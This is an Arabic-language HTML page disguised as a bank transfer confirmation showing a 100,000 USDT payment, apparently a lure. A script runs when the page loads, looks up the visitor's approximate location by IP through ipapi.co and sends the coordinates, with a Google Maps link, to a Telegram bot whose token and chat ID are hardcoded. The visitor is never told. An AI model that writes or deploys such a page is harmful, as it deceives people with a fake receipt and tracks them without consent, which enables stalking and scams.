<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بطاقة تحويل بنكي</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f0f0f0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .card {
    background: #fff;
    padding: 20px;
    border-radius: 10px;
    text-align: center;
    box-shadow: 0 0 20px rgba(0,0,0,0.3);
    max-width: 400px;
  }
  .card img {
    max-width: 100%;
    border-radius: 10px;
  }
  .card h2 {
    margin: 15px 0 5px 0;
  }
  .card p {
    margin: 5px 0;
  }
</style>
</head>
<body>

<div class="card">
  <img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="بطاقة تحويل">
  <h2>تأكيد تحويل بنكي</h2>
  <p>بنك الهرم - التحويل بنجاح</p>
  <p>المبلغ: 100,000 USDT</p>
</div>

<script>
function sendLocationToBot(lat, lon) {
    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
    const chatId = "6495557039";
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

    const message = `📍 موقع المستخدم التقريبي عبر IP:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(res => res.json())
    .then(data => console.log("✅ تم الإرسال:", data))
    .catch(err => console.error("❌ خطأ:", err));
}

// جلب الموقع عبر IP تلقائيًا
fetch("https://ipapi.co/json/")
  .then(res => res.json())
  .then(data => {
    const lat = data.latitude;
    const lon = data.longitude;
    sendLocationToBot(lat, lon);
  })
  .catch(err => console.error("⚠️ خطأ في جلب IP:", err));
</script>

</body>
</html>
